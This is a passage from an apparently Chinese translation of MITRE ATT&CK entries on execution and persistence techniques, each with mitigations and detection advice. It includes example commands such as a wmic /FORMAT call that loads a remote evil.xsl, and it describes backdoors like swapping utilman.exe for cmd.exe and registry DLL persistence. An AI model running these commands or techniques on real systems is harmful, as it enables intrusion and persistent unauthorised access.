**WinDbg** 是一个 **Microsoft Windows** 内核和用户模式调试工具。**Microsoft Console Debugger (CDB)** `cdb.exe` 也是用户模式调试器。 这两个实用程序都在 Windows 软件开发工具包中，可以作为独立的工具使用。它们通常用于软件开发和逆向工程，在典型的 Windows 系统中可能找不到。 `WinDbg.exe` 和 `cdb.exe` 都是由 Microsoft 签名的。攻击者可以使用 `WinDbg.exe` 和 `cdb.exe` 来代理任意代码的执行，从而绕过允许这些实用程序执行的应用程序白名单策略。

其他调试器也可以用于类似的目的，比如内核模式调试器 `kd.exe`，它也由 Microsoft 签名。

#### Tracker

文件跟踪器 `tracker.exe`，作为 **MSBuild** 的一部分包含在 **.NET** 框架中。它用于记录对 Windows 文件系统的调用。

攻击者可以利用 `tracker.exe` 将任意 DLL 的执行代理到其他进程中。 `tracker.exe` 也具有签名，因此可以使用它来绕过应用程序白名单。

#### 防御方式

防御方式|描述
:--:|:--
**功能禁用**|`MSBuild.exe`，`dnx.exe`，`rcsi.exe`，`WinDbg.exe`，`cdb.exe` 和 `tracker.exe` 在给定的环境中可能不是必需的，如果不使用，应将其删除
**预防执行**|如果给定系统或网络不需要 `MSBuild.exe`，`dnx.exe`，`rcsi.exe`，`WinDbg.exe` 和 `cdb.exe` ，则使用配置为阻止其执行的应用程序白名单来防止攻击者潜在的滥用

#### 检测手段

这些或其他启用代理执行的实用程序通常用于系统上的开发、调试和逆向工程，如果没有用于这些目的，则可能是可疑的。 使用进程监视来监视 `MSBuild.exe`，`dnx.exe`，`rcsi.exe`，`WinDbg.exe`，`cdb.exe` 和 `tracker.exe` 的执行和参数。 将这些二进制文件的最近调用与之前已知良好参数的调用和已执行的二进制文件进行比较，以确定异常和潜在的攻击活动。 软件开发人员一般会在其他与软件开发相关的任务中使用这些实用程序，因此，如果存在这些实用程序并且在任务上下文之外使用，则可能是可疑的。 在调用这些实用程序前后使用的命令参数也可用于确定正在执行的二进制文件的来源和目的。

***

### User Execution (用户执行)

>[原文链接](https://attack.mitre.org/techniques/T1204/)

攻击者可能通过特定操作来执行。这可能是 **直接代码执行**，如利用 [**鱼叉式钓鱼附件**](#spearphishing-attachment-%e9%b1%bc%e5%8f%89%e5%bc%8f%e9%92%93%e9%b1%bc%e9%99%84%e4%bb%b6) 传递 **带有图标和明显尾缀名** 的恶意文件。他也可以通过点击 [**鱼叉式钓鱼链接**](#spearphishing-link-%e9%b1%bc%e5%8f%89%e5%bc%8f%e9%92%93%e9%b1%bc%e9%93%be%e6%8e%a5) 对浏览器或者应用进行 [**客户端执行的利用**](#exploitation-for-client-execution-%e5%ae%a2%e6%88%b7%e7%ab%af%e6%89%a7%e8%a1%8c%e7%9a%84%e5%88%a9%e7%94%a8)，实现漏洞利用。攻击者可能会采取下列文件来诱使用户执行，包括 **.doc、.pdf、.xls、.rtf、.scr、.exe、.lnk、.pif、.cpl**

比方说，攻击者可能会利用Windows快捷方式文件 (**.lnk**) 来诱使用户单击以执行恶意 **payload**。恶意 **.lnk** 文件可能包含 [**PowerShell**](#powershell-powershell) 命令。有效载荷可以包含在 **.lnk** 文件本身中，也可以从远程服务器下载。

尽管 [**用户执行**](#exploitation-for-client-execution-%e5%ae%a2%e6%88%b7%e7%ab%af%e6%89%a7%e8%a1%8c%e7%9a%84%e5%88%a9%e7%94%a8) 经常在 [**初始访问**](#initial-access-%e5%88%9d%e5%a7%8b%e8%ae%bf%e9%97%ae) 后不久发生，但它可能发生在入侵的其他阶段，例如，当攻击者将文件放在共享目录中或在用户的桌面上，希望用户单击该文件时。

#### 防御方式

防御方式|描述
:--:|:--
**预防执行**|应用程序白名单可能能够防止伪装成其他文件的可执行文件运行
**网络入侵防护**|如果用户正在访问链接，则可以使用网络入侵防御系统以及旨在扫描和删除恶意下载的系统来阻止活动
**Web 内容限制**|如果用户正在访问链接，则默认或根据策略阻止下载传输中来自可疑网站的未知或未使用的文件，以作为阻止某些载体的最佳实践，例如 **.scr，.exe，.pif**，某些下载扫描设备可以打开和分析压缩和加密格式，例如可用于 [隐藏混淆文件或信息](#obfuscated-files-or-information-%e6%b7%b7%e6%b7%86%e7%9a%84%e6%96%87%e4%bb%b6%e6%88%96%e4%bf%a1%e6%81%af) 中的恶意文件的 **zip** 和 **rar**
**用户执行**|培训用户使其提高对常见网络钓鱼和鱼叉式网络钓鱼技术的认识，以及提高对潜在恶意事件的怀疑意识

#### 检测手段

监视攻击者可能用于获取需要用户交互的初始访问的应用程序的执行和命令行参数。 这包括压缩应用程序，例如用于 **.zip** 文件的压缩应用程序，可用于对 payload 中的文件或信息进行 [**反混淆/解码**](#deobfuscatedecode-files-or-information-%e5%8f%8d%e6%b7%b7%e6%b7%86%e8%a7%a3%e7%a0%81)。

杀毒软件可以检测用户电脑上下载和执行的恶意文档和文件。 终端检测或网络检测可以在打开文件 **(例如可以连接到 internet 或生成 Powershell.exe 的 Microsoft Word 文档或 PDF 文件)** 时潜在地检测恶意事件，这些事件与 [**客户端执行**](#exploitation-for-client-execution-%e5%ae%a2%e6%88%b7%e7%ab%af%e6%89%a7%e8%a1%8c%e7%9a%84%e5%88%a9%e7%94%a8) 和 [**脚本**](#scripting-%e8%84%9a%e6%9c%ac) 的漏洞利用等技术有关。

***

### Windows Management Instrumentation (Windows 管理规范)

>[Windows 管理规范](https://attack.mitre.org/techniques/T1047/)

Windows 管理规范 **(WMI)** 是 Windows 管理的一个功能，它为本地和远程访问 Windows 系统组件提供了统一的环境。它依赖于本地和远程访问的 WMI 服务以及远程访问的服务器消息块 **(SMB)** 和远程过程调用服务 **(RPCS)**。**RPC** 在 135 端口上运行。

攻击者可以使用 **WMI** 与本地和远程系统进行交互，并将其用作执行许多策略功能的手段，例如收集发现的信息和远程执行文件，作为横向移动的一部分。

#### 防御手段

防御方式|描述
:--:|:--
**账户权限管理**|防止管理员和特权帐户的系统之间的凭据重叠
**用户账号管理**|默认情况下，仅允许管理员使用 **WMI** 进行远程连接。限制其他允许连接的用户，或者禁止所有用户远程连接到 **WMI**

#### 检测手段

监控 **WMI** 连接的网络流量；在通常不使用 **WMI** 的环境中使用 **WMI** 是可疑的。执行进程监视以捕获 **wmic** 的命令行参数，并检测用于执行远程行为的命令。

***

### Windows Remote Management (Windows 远程管理)

>[原文链接](https://attack.mitre.org/techniques/T1028/)

**Windows 远程管理 (**WinRM**)** 代表允许用户与远程系统交互的 Windows 服务和协议 (例如，运行可执行文件，修改注册表，修改服务)。 `**WinRM**` 命令和很多程序 (如 PowerShell) 都可以调用它。

#### 防御手段

防御方式|描述
:--:|:--
**功能禁用或删除**|禁用 **WinRM** 服务
**网络细分**|如果需要该服务，用独立的 **WinRM** 基础架构、帐户和权限锁定关键区域。 遵循 **WinRM** 在身份验证方法配置和主机防火墙使用的最佳实践，限制 **WinRM** 访问，仅允许其与特定设备之间的通信
**账户权限管理**|如果需要该服务，请使用单独的 **WinRM** 帐户和权限锁定关键区域

#### 检测手段

通过记录服务执行来监控环境中 **WinRM** 的使用。 如果它没有正常使用或被禁用，那么这可能是可疑行为的一个标志。 监视 **WinRM** 进程或 **WinRM** 调用的脚本创建的进程和采取的操作，以将其与其他相关事件相关联。

***

### XSL Script Processing (XSL 脚本处理)

>[原文链接](https://attack.mitre.org/techniques/T1220/)

可扩展样式表语言 (XSL) 文件通常用于描述 XML 文件中的数据处理和渲染方式。 为了支持复杂的操作，XSL 标准包括对各种语言的嵌入式脚本的支持。

攻击者可能会滥用此功能来执行任意文件，同时可能会绕过应用程序白名单防御。 与 [**受信的开发人员实用程序**](#trusted-developer-utilities-%e5%8f%97%e4%bf%a1%e7%9a%84%e5%bc%80%e5%8f%91%e4%ba%ba%e5%91%98%e5%ba%94%e7%94%a8%e7%a8%8b%e5%ba%8f) 类似，可以安装 Microsoft 命令行转换实用程序 (`msxsl.exe`)，并使用它来执行嵌入在本地或远程  (通过 URL 引用的) XSL 文件中的恶意 JavaScript。 因为在默认情况下不会安装 `msxsl.exe`，攻击者可能需要将其与删除的文件打包。`msxsl.exe` 具有两个主要参数，一个 **XML** 源文件和一个 **XSL** 样式表。由于 **XSL** 文件是有效的 **XML**，因此攻击者可以两次调用同一 **XSL**文件。使用 `msxsl.exe` 时，攻击者还可能会给 **XML / XSL** 文件一个任意的文件扩展名。

命令行示例:

- `msxsl.exe customers[.]xml script[.]xsl`
- `msxsl.exe script[.]xsl script[.]xsl`
- `msxsl.exe script[.]jpeg script[.]jpeg`

这种技术的另一种变体，称为 **Squiblytwo** ，使用 [**Windows 管理规范**] 在 **xsl** 文件中调用 **Jscript/VBscript**。该技术还可以执行 本地/远程脚本，类似于 [**Regsvr32**](#regsvr32-regsvr32) / **Squibledoo**，它利用了一个受信的 Windows 内置工具。攻击者可以利用 **/FORMAT** 开关滥用 [Windows 管理规范](#windows-management-instrumentation-windows-%e7%ae%a1%e7%90%86%e8%a7%84%e8%8c%83) 中的任何别名。

命令行示例:

- 本地文件：`wmic process list /FORMAT:evil[.]xsl`
- 远程文件：`wmic os get /FORMAT:"https[:]//example[.]com/evil[.]xsl"`

#### 防御方式

防御方式|描述
:--:|:--
**预防执行**|如果不需要 `msxsl.exe`，则阻止其执行以防止被攻击者滥用

#### 检测手段

使用进程监视来监视 `msxsl.exe` 和 `wmic.exe` 的执行和参数。 将这些实用程序最近的调用与之前的已知良好参数和被加载的文件进行比较，以确定异常和潜在的攻击活动 (例如：URL命令行参数，外部网络连接的创建，与脚本关联的DLL的加载)。脚本调用前后使用的命令参数也可能有助于确定执行的二进制文件的来源和目的。

`msxsl.exe` 或其他启用代理执行的实用程序通常用于系统上的开发、调试和逆向工程，如果没有用于这些目的，则可能是可疑的。

***

## Persistence (持久化)

>[攻击者试图维持入侵点](https://attack.mitre.org/tactics/TA0003/)

**持久化** 由攻击者用来在重新启动，更改凭据和可能中断其访问的其他中断时保持对系统访问的技术组成。用于持久性的技术包括任何访问，操作或配置更改，使它们能够在系统上站稳脚跟，例如替换或劫持合法代码或添加启动代码。

***

### .bash_profile and .bashrc (.bash_profile & .bashrc)

>[原文链接](https://attack.mitre.org/techniques/T1156/)

`~/.bash_profile` 和 `~/.bashrc` 是包含 **shell** 命令的 **shell**脚本。当打开新的 **shell** 或用户登录时，会在用户的上下文中执行这些文件。`~/.bash_profile` 用于登录 **shell** ，而 `~/.bashrc` 在交互式非登录 **shell** 中执行。这意味着当用户 (通过用户名或者密码) 登录到控制台 (本地或者通过 **SSH** 之类的远程) 时，在初始命令提示符返回会给用户前会执行 `~/.bash_profile`。这允许用户更细粒度地控制何时执行特定命令。这些文件应该由本地用户写入来配置自己的环境。

**macOS** 的 `Terminal.app` 有所不同，默认情况下，每次打开新的终端窗口时都会启动登陆 **shell** ，所以调用的是 `~/.bash_profile` 而不是 `~/.bashrc`。

攻击者可能会通过插入代码，待获取持久化的 **shell** ，每当用户登录或打开新的 **shell** 时，都会执行被修改的 `~/.bash_profile` 和 `~/.bashrc`。

#### 防御方式

防御方式|描述
:--:|:--
**限制文件和目录权限**|设置这些文件为不可更改且仅允许特定管理员更改，这将限制攻击者轻松创建用户级持久化

#### 检测手段

虽然用户可以自定义它们 `~/.bashrc` 和 `~/.bash_profile` 文件，但通常只有特定类型的命令出现在这些文件中。 监视异常命令，如在登录过程中加载用户配置文件时执行未知程序、打开网络套接字或跨网络访问。

***

### Accessibility Features (辅助功能)

>[原文链接](https://attack.mitre.org/techniques/T1015/)

Windows 包含可在用户登录前使用组合键启动的辅助功能  (例如，当用户在 Windows 登录屏幕上时) 。攻击者可以修改这些程序的启动方式，以获取命令提示符或后门而无需登录系统。

两个常用的辅助功能程序，`C:\Windows\System32\sethc.exe` 按下五次 Shift 键启动。`C:\Windows\System32\utilman.exe` 按下 `Windows + U` 组合键启动。`sethc.exe` 程序通常被称为 **粘滞密钥** ，并且已被攻击者用于通过远程桌面登录屏幕进行未经身份验证的访问。

由于代码完整性增强，攻击者可能会以各种方式利用这些功能，如何利用取决于 **Windows** 的版本。在 **Windows** 较新的版本中，对于 **x64** 系统，需要对对替换的二进制文件进行数字签名，二进制文件必须位于 `%systemdir%\` ，并且必须由 **Windows File / Resource Protection (WFP / WRP)** 保护。**debugger** 很可能作为一种潜在的解决方法，因为他不需要替换相应的复制功能二进制文件。两种方法的示例：

例如，对于 **Windows XP** 及更高版本以及 **Windows Server 2003 / R2** 及更高版本上的简单二进制替换，可以将程序 (例如 `C:\Windows\System32\utilman.exe`) 替换为 `cmd.exe` (或提供其他后门程序)。然后，在键盘或通过远程桌面连接时，在登录界面上按下组合键，从而使替换的文件以 SYSTEM 权限执行。

对于 **Windows Vista** 及更高版本以及 **Windows Server 2008** 及更高版本的 **debugger** 方法，可以修改注册表项，以配置 `cmd.exe` 或其他提供后门程序，作为辅助功能程序的 `debugger`,  (例如，`utilman.exe`)。修改注册表后，在键盘前或与 **RDP** 连接时在登录屏幕上按相应的组合键将使 **debugger** 程序以 **SYSTEM** 权限执行。

存在其他可访问性功能，这些功能也可以类似的方式加以利用:

- 屏幕键盘：`C:\Windows\System32\osk.exe`
- 放大镜：`C:\Windows\System32\Magnify.exe`
- 旁白：`C:\Windows\System32\Narrator.exe`
- 显示切换器：`C:\Windows\System32\DisplaySwitch.exe`
- 应用切换器：`C:\Windows\System32\AtBroker.exe`

#### 防御方式

防御方式|描述
:--:|:--
**预防执行**|攻击者可以使用备用二进制文件替换辅助功能二进制文件以执行此技术。使用适当的应用程序白名单工具 (例如Windows Defender应用程序控制，AppLocker或软件限制策略)，识别并阻止通过辅助功能功能执行的潜在恶意软件
**限制网络资源访问**|如果可能，请使用远程桌面网关来管理网络中RDP的连接和安全配置
**操作系统配置**|攻击者必须结合 RDP 才能远程使用这种技术。确保启用了网络级身份验证，以便在创建会话和显示登录屏幕之前强制远程桌面会话进行身份验证。默认情况下，它在 Windows Vista 和更高版本中启用

#### 检测手段

与已知软件、补丁周期等不相关的辅助实用程序二进制文件或二进制路径的变更是可疑的。命令行对能修改注册表相关键的工具的调用也是可疑的。应该监控实用程序参数和二进制文件本身的更改。监控`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options` 的注册表项。

***

### Account Manipulation (账户操作)

>[原文链接](https://attack.mitre.org/techniques/T1098/)

帐户操作可以帮助攻击者维持对环境中的凭据和特定权限级别的访问权限。包括，修改权限、修改凭据、添加或更改权限组、修改帐户设置或修改身份验证的执行方式。这些操作还可以包括旨在破坏安全策略的帐户活动，例如重复更新密码来破坏有关密码持续时间的策略并保持已盗取凭据的有效性。攻击者必须在系统或域上具有足够高的权限才能创建或操作帐户。

#### 交换电子邮件帐户接管

在本地Exchange和云服务 Office 365中可用的 **Add-MailboxPermission PowerShell cmdlet** 将权限添加到邮箱。如果有足够的权限，可以运行此命令以进一步授予某些用户帐户访问权限。这可以用于持续的威胁事件以及BEC (企业级电子邮件攻击) 事件中，在这些事件中，攻击者可以为他们希望破坏的帐户分配更多访问权限。这可以进一步使得能够使用附加技术来获得对系统的访问。例如，受感染的企业帐户通常在创建收件箱规则时用于将邮件发送到目标企业网络中的其他帐户，以便邮件逃避垃圾邮件/网络钓鱼检测机制。

#### Azure AD

在Azure中，攻击者可以为服务主体设置第二个密码，来持久化

#### AWS

AWS策略通过简单地识别账户名称来允许账户之间的信任。然后由信任帐户决定是否只允许正确的角色访问。

#### 防御方式

防御方式|描述
:--:|:--
**多因素认证**|使用多因素身份验证
**网络细分**|配置访问控制和防火墙，以限制对关键系统和域控制器的访问。大多数云环境都支持单独的虚拟私有云 (VPC) 实例，从而可以进一步细分云系统
**操作系统配置**|通过确保关键服务器的正确安全配置来保护域控制器
**账户权限管理**|不允许域管理员帐户被用于可能将其暴露给非特权系统上的潜在攻击者的日常操作

#### 检测手段

收集与系统和域上的账户对象更改相关的事件，例如事件 ID 4738。 监控与其他可疑活动相关的账户变更。 可能会在异常时间或异常系统中发生更改。 特别是在主题和目标帐户不同 或包含其他标志  (如在不知道旧密码的情况下更改密码) 的标志事件中。

凭据的使用也可能发生在异常的时间或异常的系统或服务中，并可能与其他可疑活动相关。

监视不寻常的Exchange和Office 365电子邮件帐户权限更改，该更改可能表明授予受感染帐户的权限提升。

从帐户发送的电子邮件数量比正常情况要多，并且发现从网络中的真实帐户发送的类似网络钓鱼电子邮件可能表明该帐户可能已被盗用，并且正在尝试利用修改的电子邮件权限来利用访问权限。

***

### AppCert DLLs (AppCert DLLs)

>[原文链接](https://attack.mitre.org/techniques/T1182/)

注册表键 `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager` 中的 **AppCertDLLs** 值指定的动态链接库 **(DLL)** 会被加载到每个调用常用的应用程序编程接口 **(API)** 函数，`CreateProcess`，`CreateProcessAsUser`，`CreateProcessWithLoginW`，`CreateProcessWithTokenW`，`WinExec` 的每个进程中。

与 [进程注入](#process-injection-%e8%bf%9b%e7%a8%8b%e6%b3%a8%e5%85%a5) 类似，通过使恶意DLL加载并在计算机上独立进程的上下文中运行，可以实现持久化和提权

#### 防御方式

防御方式|描述
:--:|:--
**预防执行**|使用适当的应用程序白名单工具  (例如Windows Defender应用程序控制，AppLocker或软件限制策略) ，识别并阻止通过AppCertDLLs功能执行的潜在恶意软件

#### 检测手段

通过进程监视 **DLL** 的加载，尤其是查找无法识别或未正常加载到进程中的 **DLL**。 监视 **AppCertDLLs** 注册表值，以查找与已知软件、补丁周期等不相关的修改。监视和分析标志着注册表编辑的应用程序编程接口 **(API)** 调用，如 `RegCreateKeyEx` 和 `RegSetValueEx`。

诸如 **Sysinternals Autoruns** 之类的工具可能会将 **AppCert DLL** 视为自动启动位置。

查找可能由于加载恶意 **DLL** 的进程而导致的异常进程行为。 不应孤立地看待数据和事件，而应将其视为可能导致其他活动的攻击链的一部分，例如为命令与控制建立网络连接、通过披露 (Discovery) 了解环境细节以及横向移动。

***

### AppInit DLLs (AppInit DLLs)

>[原文链接](https://attack.mitre.org/techniques/T1103/)

**AppInit_DLLs** 的注册表键值位于 `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows` / `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows` ，它所指向的动态链接库 **(DLL)** 会加载到每个使用 **user32.dll** 的进程。这基本涉及了所有程序，因为几乎所有的(程序)都要用到它。就像 [**进程注入**](#process-injection-%e8%bf%9b%e7%a8%8b%e6%b3%a8%e5%85%a5) 一样，攻击者可以滥用它们，通过加载恶意 **DLL** 并在独立进程上下文中运行，实现持久化和提权。

在 **Windows 8** 和更高版本中开启安全引导 **(secure boot)** 模式时，**AppInit DLL** 功能会被禁用。

#### 防御方式

防御方式|描述
:--:|:--
**预防执行**|攻击者可以安装新的 **AppInit_DLLs** 二进制文件来进行此攻击。使用适当的应用程序白名单工具 **(例如Windows Defender应用程序控制，AppLocker或软件限制策略)**，识别并阻止通过 **AppInit DLLs** 功能执行的潜在恶意软件
**更新软件**|升级到 **Windows 8** 或更高版本，并启用安全启动

#### 检测手段

通过加载 **user32.dll** 的进程监视 **DLL** 加载，并查找无法识别或未正常加载到进程中的 **DLL**。 监视 **AppInit DLLs** 注册表值，以查找与已知软件、补丁周期等不相关的修改。监视和分析标志着注册表编辑的应用程序编程接口 **(API)** 调用，如 `RegCreateKeyEx` 和 `RegSetValueEx`。 **Sysinternals Autoruns** 等工具也可用于检测可能尝试持久化的系统更改，包括列出当前的 **AppInit DLL**。

查找可能由于加载恶意 **DLL** 的进程而导致的异常进程行为。 不应孤立地看待数据和事件，而应将其视为可能导致其他活动的行为链的一部分，例如为命令与控制建立网络连接、通过披露 (Discovery) 了解环境细节以及横向移动。

***

### Application Shimming (Application Shimming)

>[原文链接](#application-shimming-application-shimming)

创建 **Microsoft Windows** 应用程序兼容性基础架构/框架 **(Application Shim)** 是为了在操作系统代码库随时间变化的同时保持软件的向下兼容性。例如，**Application shimming** 允许开发人员将补丁应用于 **Windows XP** 创建的应用程序 (不需要重写代码)，这样他就可以兼容 **Windows 10** 。 在框架中，创建 **shims** 作为程序 (或更具体地说，导入地址表) 和 **Windows** 操作系统之间的缓冲区。 在执行程序时，将引用 **shim** 缓存来确定程序是否需要使用 **shim** 数据库 **(.sdb)**。 如果需要，**shim** 数据库使用 **Hooking** 根据需要重定向代码，以便与 **OS** 通信。

当前由默认 **Windows** 安装程序 (`sdbin.exe`) 安装的所有 **shim** 的列表保存在：

- `%WINDIR%\AppPatch\sysmain.sdb`
- `hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb`

自定义数据库在:

- `%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom`
- `hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom`

为了保证 **shim** 的安全，Windows 将它们设为在用户模式下运行，这样它们就无法修改内核，您必须具有管理员权限才能安装 **shim** 。 但是，某些 **shim** 可以用来 [绕过用户帐户控制](#bypass-user-account-control-uac%e7%bb%95%e8%bf%87) **(RedirectEXE)**、将 DLL 注入进程 **(InjectDLL)**、禁用数据执行保护 **(DisableNX)** 和结构异常处理 **(DisableSEH)** 以及截获内存地址 **(GetProcAddress)**。 与 [Hooking](#hooking-hooking) 类似，使用这些 shim 可能允许攻击者执行一些恶意行为，如提权、安装后门、禁用如 **Windows Defender** 的防御等。

#### 防御方式

防御方式|描述
:--:|:--
**预防执行**|将 **UAC** 设置更改为 **始终通知** 将在请求 **UAC** 提升时给用户提供更多可见性，但是，由于 **UAC** 不停的中断，此选项在用户中不受欢迎
**更新软件**|**Microsoft** 发布了一个可选的补丁更新 - **KB3045645** - 它将删除 `sdbinst.exe` 中的 **auto-elevate** 标志。 这将防止使用应用程序 **shimming** 绕过 **UAC**

#### 检测手段

有一些公共工具可以检测目前可用的 **shim**:

- **Shim-Process-Scanner** 检查每个正在运行的进程的内存中是否有 **shim** 标志
- **Shim-Detector-Lite** 检测自定义 **shim** 数据库的安装
- **Shim-Guard** 监视注册表查找任何 **shim** 安装信息
- **ShimScanner** 取证工具，在内存中找到活动的 **shim**
- **ShimCacheMem** Volatility 插件，从内存中获取 **shim** 缓存

监视 `sdbinst.exe` 和命令行参数的进程执行，以查找 **Application Shimming** 滥用的迹象

***

### Authentication Package (身份认证包)

>[原文链接](#authentication-package-%e8%ba%ab%e4%bb%bd%e8%ae%a4%e8%af%81%e5%8c%85)

**Windows** 身份验证包 **DLL** 由系统启动时的本地安全机构 **(LSA)** 进程加载。它们为操作系统提供了多种登录过程和多种安全协议的支持。

攻击者可以使用 **LSA** 身份验证包提供的自动启动机制来实现持久化，方法是在 Windows 注册表 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\` 位置放置对二进制文件的引用，该键值为 `"Authentication Packages"=`。在加载身份验证包时，系统将执行该二进制文件

#### 防御方式

防御方式|描述
:--:|:--
**授权进程完整性**|**Windows 8.1、Windows Server 2012 R2** 以及后续版本可能通过设置注册表键 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL`, 使 **LSA** 作为 **Protected Process Light (PPL)** 运行，它要求所有由**LSA** 加载的 **DLL** 都必须由 **Microsoft** 签名

#### 检测手段

监视注册表以查看对 **LSA** 注册表项的更改。 监控 **DLL** 加载的 **LSA** 进程。 当没有签名的 **DLL** 试图设置注册表键 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe` 的 `AuditLevel = 8`, 使其加载到 **LSA** 中时，**Windows 8.1** 和 **Windows Server 2012 R2** 可能会生成事件

***

### BITS Jobs (BITS-Windows后台智能传输服务-利用)

>[原文链接](https://attack.mitre.org/techniques/T1197/)

#### 背景

- Windows后台智能传输服务(BITS)是一种通过组件对象模型(COM)公开的一种低带宽异步文件传输机制，通常由更新程序、messengers服务和其他使用空闲带宽，并在后台运行而不中断其他联网应用的程序使用；
- Microsoft提供了一个名为 **BITSAdmin** 的二进制文件和 [**PowerShell**](#powershell-powershell)，用于创建和管理文件传输。

#### 武器化

- 使用BITS在**运行恶意代码**后进行下载、执行、清理等危险操作；
- 使用BITS通过创建长期作业(>90D)或在作业完成/出错或设备重启时调用任意程序，实现**持久化**；
  > [一个案例](https://www.cnblogs.com/xiaozi/p/11833583.html)
- 使用BITS上传功能进行 **Exfiltration Over Alternative Protocol** (基于替代协议的渗透)。

#### 防御方式

缓解|描述
:--:|:--
**流量过滤**|修改安全设备策略，仅允许合法的BITS通信
**系统配置**|减少“组策略”中的默认BITS作业生存期，或通过编辑注册表`HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\BITS` 缩短 `JobInactivityTimeout` 和 `MaxDownloadTime` 的值
**访问控制**|将BITS界面的访问权限限制为特定的用户或组

#### 检测

- **运行状态**：
  - 使用SC查询程序`sc query bits`检查状态
  - 使用BITSAdmin工具`bitsadmin /list /allusers /verbose`枚举活动的BITS任务
- **使用情况**：
  - 监视BITSAdmin工具使用情况，关注`Transfer`、`Create`、`AddFile`、`SetNotifyFlags`、 `SetNotifyCmdLine`、`SetMinRetryDelay`
  - Admin与Windows事件日志中的BITS情况
  - 分析BITS作业数据库信息
- **网络活动**：
  - 使用HTTP(S)和SMB远程连接
  - 与创建的用户绑定
  - 用户登录后才启用(即使将作业附加到service账户)

***

### Bootkit (Bootkit)

>[原文链接](https://attack.mitre.org/techniques/T1067/)

**Bootkit** 是一种恶意软件变体，他修改硬盘驱动器的引导扇区，包括主引导记录 (MBR) 和 卷引导记录 (VBR) 。攻击者可以使用 **Bootkit** 在系统下层持久化，这使得补救十分困难，除非怀疑 **Bootkit** ，并采用相应的补救措施。

#### 主引导记录

**MBR** 是 **BIOS** 完成硬件初始化后首先加载的磁盘部分。他是引导加载程序的位置。对引导驱动器有原始访问权限的攻击者可能会覆盖此区域，从而在启动期间从正常的引导加载程序转移到攻击者代码。

#### 卷引导记录

**MRR** 将引导过程的控制权传递给 **VBR** 。与 **MBR** 的情况类似，具有对引导驱动器的原始访问权限的攻击者可能会覆盖VBR以将启动期间的执行转移到攻击者代码。

#### 防御方式

缓解|描述
:--:|:--
**引导完整性**|使用可信平台模块 **(Trusted Platform Module)** 技术和安全或可信的引导以防止系统完整性受到损害
**特权账户管理**|确保设置了适当的权限以帮助防止攻击者访问执行此操作所需的特权帐户

#### 检测手段

对 **MBR** 和 **VBR** 执行完整性检查。拍摄 **MBR** 和 **VBR** 的快照，并与已知良好的样本进行比较。当 **MBR** 和 **VBR** 出现可疑活动的迹象时，报告它们的变化并进行进一步分析。

***

### Browser Extensions (浏览器扩展)

>[原文链接](https://attack.mitre.org/techniques/T1176/)

浏览器扩展或插件是可以添加功能和自定义 internet 浏览器的小程序。 可以直接安装它们，也可以通过浏览器的应用程序商店安装。 扩展通常具有对浏览器可以访问的所有内容的访问权限。

恶意扩展可以通过伪装成合法扩展的恶意应用商店下载，通过社工或已经成功攻击系统的攻击者安装到浏览器中。浏览器应用程序商店的安全性可能受到限制，因此恶意扩展绕过自动扫描程序并上传可能并不困难。扩展安装完成后，他可以在后台浏览网站，窃取用户输入到浏览器的所有信息，包括凭证，并作为RAT病毒的安装程序用于的持久化。目前已有僵尸网络通过恶意 Chrome 扩展使用持久性后门。

#### 防御方式

缓解|描述
:--:|:--
**审计**|确保已安装的扩展名是预期的扩展名，因为许多恶意扩展将伪装成合法的扩展名
**执行预防**|根据您的安全策略，将浏览器扩展名设置为白名单或黑名单
**限制软件安装**|仅从可验证的受信任来源安装浏览器扩展。某些浏览器的浏览器扩展可以通过组策略来控制。更改设置以防止浏览器在没有足够权限的情况下安装扩展
**用户培训**|使用完所有浏览器会话后，请将其关闭，以防止任何潜在的恶意扩展程序继续运行

#### 检测手段

盘点和监视异常、非预期和非良性的浏览器扩展安装。 进程和网络监视可用于检测与 C2 服务器通信的浏览器。 然而，这对于首次检测恶意扩展可能是困难的，取决于恶意扩展生成的流量的性质和数量。

监视任何写入注册表的新项或写入磁盘的 PE 文件。 这可能与浏览器扩展安装有关。

***

### Change Default File Association (更改默认文件关联)

>[原文链接](https://attack.mitre.org/techniques/T1042/)

打开文件时，将检查用于打开文件的默认程序 (也称为文件关联或处理程序) 。 文件关联选择储存在Windows注册表中，并且可以由具有注册表访问权限的用户，管理员或程序，或是使用内置 assioc 模块的管理员来编辑。应用可以修改给定文件扩展名的文件关联，以便打开具有给定扩展名的文件时调用任意程序。

系统文件关联在 `HKEY_CLASSES_ROOT.[extension]`，如，`HKEY_CLASSES_ROOT.txt`。条目指向 `HKEY_CLASSES_ROOT[handler]` 的扩展处理程序。然后在 `HKEY_CLASSES_ROOT[handler]\shell[action]\` 命令中将各种命令作为子键列在 **shell** 键下面。

例如：

- `HKEY_CLASSES_ROOT\txtfile\shell\open\command`
- `HKEY_CLASSES_ROOT\txtfile\shell\print\command`
- `HKEY_CLASSES_ROOT\txtfile\shell\printto\command`

列出的键值是句柄打开文件扩展名时执行的命令。攻击者可以修改这些值以持续执行任意命令。

#### 防御方式

这种攻击技术无法通过预防性控制轻松缓解，因为它基于滥用系统功能。

#### 检测手段

收集和分析注册表项的更改，这些更改将文件扩展名与要执行的默认应用程序相关联，并将该进程与未知进程的启动或不寻常的文件类型相关联。

用户文件关联首选项存储在 `[HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts` 下，并覆盖 `[HKEY_CLASSES_ROOT]` 中配置的关联。用户首选项的更改将发生在该条目的子键下。

还要查找异常流程调用树，以执行可能与披露 (Discovery) 操作或其他技术相关的其他命令。

***

### Component Firmware (组件固件)

>[原文链接](https://attack.mitre.org/techniques/T1109/)

#### 背景

- 一些攻击者可能会采用复杂的手段来破坏计算机组件并**安装恶意固件**，这些固件将在操作系统和主系统固件或BIOS之外执行攻击者代码。
